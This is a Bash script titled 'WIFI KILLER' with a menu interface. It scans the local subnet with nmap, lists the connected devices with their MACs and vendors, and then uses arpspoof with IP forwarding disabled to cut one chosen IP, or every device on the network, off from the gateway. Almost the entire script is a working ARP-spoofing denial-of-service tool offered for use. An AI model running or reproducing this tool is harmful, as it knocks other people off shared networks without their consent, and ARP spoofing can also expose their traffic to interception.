#!/bin/bash

## @Magdeoz

bldred='\e[1;31m' # BoldRed
red='\e[7;31m'    # Red
txtgrn='\e[0;90m' # Green
txtrst='\e[0;31m'    # Text Reset
bldcyn='\e[1;32m' # Cyan
bld='\e[1;1m'     # Bold
sub='\e[1;7m'
mk='\e[0;9m'      # Subrayado
window='\e[0;31m' # Window
version='1.5'

if [ "$(id -u)" != "0" ]; then
        echo "Sorry, you must run this script as root." 1>&2
        exit 1
fi

iwconfig > tmp 2>/dev/null
INTERFACE=$(grep -m 1 '802' tmp | awk '{print $1}') #default interface
rm tmp 2>/dev/null
IP=`route -n | grep 'UG[ \t]' | awk '{print $2}'`

GOTOHELP()
{
 clear
 echo -e "    ""${window}|@#@#@#@#@#@#@#@#@#@#@#@#@#@#@#@#@#@#@#@#@#@|${txtrst}"
 echo -e "    ""${window}|#|${txtrst}""                                       ""${window}|#|${txtrst}"
 echo -e "    ""${window}|@|${txtrst}""      ""${bld}WIFI KILLER - Version $(echo "$version")${txtrst}""        ""${window}|@|${txtrst}"
 echo -e "    ""${window}|#|${txtrst}""                                       ""${window}|#|${txtrst}"
 echo -e "    ""${window}|@|${txtrst}""xxx.xxx.xxx.xxx: block the provided ip ""${window}|@|${txtrst}"
 echo -e "    ""${window}|#|${txtrst}""                                       ""${window}|#|${txtrst}"
 echo -e "    ""${window}|@|${txtrst}"" For your Network Interface open a     ""${window}|@|${txtrst}"
        echo -e "    ""${window}|#|${txtrst}""            terminal                   ""${window}|#|${txtrst}"
  echo -e "    ""${window}|@|${txtrst}"" and type 'iwconfig' without quotes    ""${window}|@|${txtrst}"
 echo -e "    ""${window}|#|${txtrst}""                                       ""${window}|#|${txtrst}"
 echo -e "    ""${window}|@#@#@#@#@#@#@#@#@#@#@#@#@#@#@#@#@#@#@#@#@#@|${txtrst}"
 echo " "
    echo "    Presione cualquier tecla para continuar..."
    read -n1
    clear
    GOTOMAIN
}

#List hosts on your network. Using sudo we can access to the mac address and the nic vendor.
GOTOUSERS () {
        clear
        echo -e "    ""${window}|@#@#@#@#@#@#@#@#@#@#@#@#@#@#@#@#@#@#@#@#@#@|${txtrst}"
        echo -e "    ""${window}|#|${txtrst}""                                       ""${window}|#|${txtrst}"
        echo -e "    ""${window}|@|${txtrst}""      ""${bld}WIFI KILLER - Version $(echo "$version")${txtrst}""        ""${window}|@|${txtrst}"
        echo -e "    ""${window}|#|${txtrst}""                                       ""${window}|#|${txtrst}"
        echo -e "    ""${window}|@|${txtrst}""        Network Scanning...            ""${window}|@|${txtrst}"
        echo -e "    ""${window}|#@#@#@#@#@#@#@#@#@#@#@#@#@#@#@#@#@#@#@#@#@#|${txtrst}"
        echo -e 

nmap_result=$(sudo nmap -sP $IP/24) #checks who's responding to ping 192.168.1.0-256
own_ip=$(ifconfig $INTERFACE | grep inet | awk '{print $2}' | cut -d':' -f2) #gets your own ip
temp_mac=$(echo "$nmap_result" | grep "MAC Address:" | awk '{print $3;}') #gets the mac addresses list
temp_ip=$(echo "$nmap_result" | grep "192.168." | awk '{print $5;}' | grep -v "$own_ip") #gets the ip list
temp_vendor=$(echo "$nmap_result" | grep "MAC Address:" | awk '{print $4;}') #gets the vendor list

readarray -t mac <<<"$temp_mac" #converts it to array named mac
readarray -t ip <<<"$temp_ip" #converts it to array named ip
readarray -t vendor <<<"$temp_vendor"

len=${#mac[@]} # length of mac addresses array
echo " "
#echo -e "    ""${window}|___________________________________________|${txtrst}"
echo " "
echo "    ""List of connected devices (vendor: ip - mac):"
echo "    ""Your own ip address is $own_ip"
echo ""
for (( i=0; i<${len}; i++ ));
do
echo -e "    ""${window}|___________________________________________|${txtrst}"
echo " "
echo -e "    " ${vendor[i]}": "${ip[i]}" - "${mac[i]}
done
echo -e "    ""${window}|___________________________________________|${txtrst}"
echo ""
echo "       Presione cualquier tecla para continuar"

read -n1
GOTOMAIN
}


#Kills the ip in the argument, all if there is no argument.
GOTOSPECIFIC () {
clear
echo -e "    ""${window}|@#@#@#@#@#@#@#@#@#@#@#@#@#@#@#@#@#@#@#@#@#@|${txtrst}"
echo -e "    ""${window}|#|${txtrst}""                                       ""${window}|#|${txtrst}"
echo -e "    ""${window}|@|${txtrst}""      ""${bld}WIFI KILLER - Version $(echo "$version")${txtrst}""        ""${window}|@|${txtrst}"
echo -e "    ""${window}|#|${txtrst}""                                       ""${window}|#|${txtrst}"
echo -e "    ""${window}|@|${txtrst}"" IP formart: xxx.xxx.xxx.xxx           ""${window}|@|${txtrst}"
echo -e "    ""${window}|#|${txtrst}""                                       ""${window}|#|${txtrst}"
echo -e "    ""${window}|@|${txtrst}"" Type C for cancel                     ""${window}|@|${txtrst}"
echo -e "    ""${window}|#@#@#@#@#@#@#@#@#@#@#@#@#@#@#@#@#@#@#@#@#@#|${txtrst}"
read -p '    IP or C (cancel): ' victim
if [[ "$victim" =~ [0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3} ]]; then
        echo "gonna kill em $victim "
        target="-t $victim"
        echo -n 0 > /proc/sys/net/ipv4/ip_forward
        arpspoof -i $INTERFACE $target $IP
        echo -n $oldipforward > /proc/sys/net/ipv4/ip_forward
elif [[ "$victim" == "C" ]]; then
        GOTOMAIN
elif [[ "$victim" == "c" ]]; then
        GOTOMAIN
else
        echo "Wrong ip format. Please try again"
        sleep 1.5s
        GOTOSPECIFIC
fi
}
 
KILL () {
        echo -n 0 > /proc/sys/net/ipv4/ip_forward
        arpspoof -i $INTERFACE $IP

if [[ $? -eq 1 ]]; then
        echo "Try to edit arpspoof command with your current network interface."
fi
        echo -n $oldipforward > /proc/sys/net/ipv4/ip_forward
}

GOTOKILLALL () {
clear
echo -e "    ""${window}|@#@#@#@#@#@#@#@#@#@#@#@#@#@#@#@#@#@#@#@#@#@|${txtrst}"
echo -e "    ""${window}|#|${txtrst}""                                       ""${window}|#|${txtrst}"
echo -e "    ""${window}|@|${txtrst}""      ""${bld}WIFI KILLER - Version $(echo "$version")${txtrst}""        ""${window}|@|${txtrst}"
echo -e "    ""${window}|#|${txtrst}""                                       ""${window}|#|${txtrst}"
echo -e "    ""${window}|@|${txtrst}""  press control-c  to stop             ""${window}|@|${txtrst}"
echo -e "    ""${window}|#@#@#@#@#@#@#@#@#@#@#@#@#@#@#@#@#@#@#@#@#@#|${txtrst}"
sleep 2s


#First of all, check if the required programs are installed
type arpspoof >/dev/null 2>&1 || { echo >&2 "Arpspoof it's required but it's not installed.\n Do 'sudo apt-get install dsniff' Aborting."; exit 1; }
type nmap >/dev/null 2>&1 || { echo >&2 "Nmap it's required but it's not installed.\n Do 'sudo apt-get install nmap' Aborting."; exit 1; }

#if [[ "$2" == "-i" ]]; then
#        INTERFACE=$3
#fi

oldipforward=`cat /proc/sys/net/ipv4/ip_forward`

KILL $1
}


GOTOMAIN () {
 clear
 echo -e "    ""${window}|@#@#@#@#@#@#@#@#@#@#@#@#@#@#@#@#@#@#@#@#@#@|${txtrst}"
 echo -e "    ""${window}|#|${txtrst}""                                       ""${window}|#|${txtrst}"
 echo -e "    ""${window}|@|${txtrst}""      ""${bld}WIFI KILLER - Version $(echo "$version")${txtrst}""        ""${window}|@|${txtrst}"
 echo -e "    ""${window}|#|${txtrst}""                                       ""${window}|#|${txtrst}"
 echo -e "    ""${window}|@|${txtrst}""  ""Please select your option:""           ""${window}|@|${txtrst}"
 echo -e "    ""${window}|#|${txtrst}""                                       ""${window}|#|${txtrst}"
 echo -e "    ""${window}|@|${txtrst}""  ""1) [+] KILL ALL""                      ""${window}|@|${txtrst}"
 echo -e "    ""${window}|#|${txtrst}""  ""2) [+] SPECIFIC IP""                   ""${window}|#|${txtrst}"
        echo -e "    ""${window}|@|${txtrst}""  ""3) [+] SHOW USERS IP's""               ""${window}|@|${txtrst}"
 echo -e "    ""${window}|#|${txtrst}""  ""4) [+] HELP""                          ""${window}|#|${txtrst}"
 echo -e "    ""${window}|@|${txtrst}"" ""Q/q [-] Exit Script""                   ""${window}|@|${txtrst}"
 echo -e "    ""${window}|#|${txtrst}""                                       ""${window}|#|${txtrst}"
 echo -e "    ""${window}|@#@#@#@#@#@#@#@#@#@#@#@#@#@#@#@#@#@#@#@#@#@|${txtrst}"
 read -p '    Option: ' OPT
 if [[ ! $OPT == "1" ]]; then
  if [[ ! $OPT == "2" ]]; then
   if [[ ! $OPT == "3" ]]; then
    if [[ ! $OPT == 4 ]]; then
                                        if [[ ! $OPT == q ]]; then
         if [[ ! $OPT == Q ]]; then
         clear
         echo -e "    ""${window}|@#@#@#@#@#@#@#@#@#@#@#@#@#@#@#@#@#@#@#@#@#@|${txtrst}"
         echo -e "    ""${window}|#|${txtrst}""                                       ""${window}|#|${txtrst}"
         echo -e "    ""${window}|@|${txtrst}""      ""${bld}WIFI KILLER - Version $(echo "$version")${txtrst}""        ""${window}|@|${txtrst}"
         echo -e "    ""${window}|#|${txtrst}""                                       ""${window}|#|${txtrst}"
         echo -e "    ""${window}|@#@#@#@#@#@#@#@#@#@#@#@#@#@#@#@#@#@#@#@#@#@|${txtrst}"
         echo " "
         echo -e "    ""${bldred}Invalid Input: Please try again!${txtrst}"
         sleep 1s
         GOTOMAIN
                                                fi
     fi
    fi
   fi
  fi
 fi
 case $OPT in
 1) GOTOKILLALL ;;
 2) GOTOSPECIFIC ;;
        3) GOTOUSERS ;;
 4) GOTOHELP ;;
 Q) clear; echo -e "${bldcyn}Goodbye"; sleep 2s; clear; exit;;
 q) clear; echo -e "Goodbye"; sleep 2s; clear; exit;;
 esac
}

GOTOMAIN
